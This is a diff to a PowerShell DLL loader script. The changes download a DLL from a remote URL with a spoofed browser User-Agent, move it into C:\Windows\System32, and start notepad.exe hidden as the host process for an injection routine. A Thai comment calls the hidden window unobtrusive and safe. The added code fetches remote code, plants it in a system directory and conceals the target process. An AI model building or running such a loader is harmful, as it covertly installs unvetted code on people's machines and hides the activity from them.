@@ -34,8 +34,8 @@ Start-Service -Name "cbdhsvc*" -ErrorAction SilentlyContinue
 # 3. Console Styling & Compact Window Size
 $host.UI.RawUI.BackgroundColor = [ConsoleColor]::Black
 $host.UI.RawUI.ForegroundColor = [ConsoleColor]::Green
-$host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(40, 7.5)
-$host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(40, 7.5)
+$host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(60, 25)
+$host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(60, 25)
 
 # 4. Global Paths & Configuration
 $global:TargetDir = "C:\Windows\System32"
@@ -78,16 +78,18 @@ function Invoke-InstallDll {
 
     Write-Host "[*] Downloading DLL from direct link..." -ForegroundColor Cyan
     try {
-        $tempFile = Join-Path $global:TargetDir "temp_download.dll"
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        $tempFile = Join-Path $env:TEMP "temp_download.dll"
         $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
+        
         Invoke-WebRequest -Uri $global:DirectUrl -OutFile $tempFile -Headers $headers -UseBasicParsing
         
         if (Test-Path $global:DllFullPath) {
             Remove-Item $global:DllFullPath -Force
         }
         
-        Rename-Item -Path $tempFile -NewName $global:DllName
-        Write-Host "[+] Installed " -ForegroundColor Green
+        Move-Item -Path $tempFile -Destination $global:DllFullPath -Force
+        Write-Host "[+] Installed & renamed to '$global:DllName'!" -ForegroundColor Green
     }
     catch {
         Write-Host "[-] Download failed: $_" -ForegroundColor Red
@@ -100,7 +102,12 @@ function Invoke-RunInjection {
         return
     }
 
-    $process = Start-Process taskmgr.exe -PassThru
+    # เปิด Notepad แบบซ่อนหน้าต่าง (Hidden) ไม่ให้มีหน้าต่างเด้งกวนใจ และปลอดภัยต่อระบบ
+    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
+    $startInfo.FileName = "notepad.exe"
+    $startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $process = [System.Diagnostics.Process]::Start($startInfo)
+    
     Start-Sleep -Milliseconds 800
     $pidNum = $process.Id
 
